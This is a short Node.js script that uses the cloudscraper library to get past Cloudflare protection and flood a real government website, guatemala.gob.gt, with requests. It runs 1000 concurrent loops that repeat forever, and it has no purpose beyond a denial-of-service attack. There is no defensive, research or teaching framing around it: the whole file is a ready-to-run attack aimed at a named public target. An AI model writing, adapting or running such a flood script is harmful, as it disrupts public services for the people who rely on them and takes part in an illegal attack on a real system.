var cloudscraper = require('cloudscraper');
const site = "https://www.guatemala.gob.gt";

let promises = [];

function createThread() {
  return new Promise((resolve, reject) => {
    try {
      cloudscraper.get(site, function (error, response, body) {
        if (error) {
          resolve('Error');
        } else {
          resolve('Success');
        }
      });
    } catch (e) {
      resolve('Error')
    }
  });
}

async function infiniteThread() {
  try {
    await createThread();
  } catch (e) {
  }
  infiniteThread();
}

for (let index = 0; index < 1000; index++) {
  infiniteThread();
}